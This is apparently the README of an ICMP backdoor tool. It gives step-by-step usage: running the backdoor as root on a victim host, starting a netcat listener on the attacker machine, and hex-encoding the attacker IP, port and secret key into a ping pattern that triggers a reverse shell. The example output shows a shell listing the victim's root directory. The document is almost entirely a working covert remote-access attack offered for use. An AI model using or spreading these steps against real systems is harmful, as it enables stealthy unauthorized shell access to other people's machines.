An altered version of the ICMP backdoor that doesn't rely on `nping` as to maximize the live-off-the-land-ness.  

# Usage
On the host machine:
```
$ make
$ sudo ./backdoor
```
Check the secret:
```
$ ./backdoor -v                                         
Secret Key:		0x427e
Service Name:		backdoor
Shell Path:		/bin/bash
```

On the attacker machine, start your netcat listener:
```
$ nc -lnvp <port>
```
Then, we need to convert the IP and port to hex. We can easily do this with a python shell:
```
$ python
>>> import socket
>>> socket.inet_aton("127.0.0.1").hex()
'7f000001
>>> hex(int(4096))
'0x1000'
```
Our payload just becomes `<attacker ip hex> + <port> + <secret>`. In this case:
```
$ ping -c 1 -p "7f0000011000427e" <victim ip>
```
And bam! We get our shell:
```
$ nc -l -p 4096
/bin/bash
ls
bin
boot
dev
etc
home
keybase
lib
lib64
lightdm
lost+found
media
mnt
nix
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
```
